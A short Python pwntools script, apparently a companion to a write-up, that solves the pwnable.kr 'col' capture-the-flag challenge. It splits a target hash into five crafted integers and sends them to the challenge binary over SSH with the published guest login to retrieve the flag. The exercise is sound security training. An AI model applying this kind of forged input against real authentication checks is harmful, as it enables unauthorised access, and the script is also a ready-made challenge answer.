from pwn import *

if __name__ == '__main__':
    # Original hashcode from the col script.
    og_hashcode = 0x21DD09EC
    
    # Dividing by 5 because the loop in the col.c code is looping by 5. Type-cast into to remove the remainder and get the first part of the hashcode.
    hashcode_a = int(og_hashcode / 5)
    print("First part of the hashcode is: {}".format(hex(hashcode_a)))
    
    # Find the second part of the hashcode by multiplying the value we got above by 4 and then subtracting it from the original hashcode.
    hashcode_b = og_hashcode - (hashcode_a * 4)
    print("Final part of the hashcode {}".format(hex(hashcode_b)))
    
    # Change both to little-endian so we can pass it as an argument.
    LSB_hashcode_a = p32(hashcode_a)
    LSB_hashcode_b = p32(hashcode_b)
    
    # SSH into the machine to do the ctf.
    my_ssh = ssh("col", "pwnable.kr", password="guest", port=2222)
    
    # Construct our payload, this is different from the one we used in the write-up asi the pwntools process will run it with the provided args appropriately for us.
    payload = LSB_hashcode_a * 4 + LSB_hashcode_b
    
    # Run the process after we've ssh'd into the machine.
    p = my_ssh.process(executable="./col", argv=["col", payload])

    # Receive input from the machine so we can see the flag and print it.
    ret = p.recv()
    print(ret.decode('utf-8'))
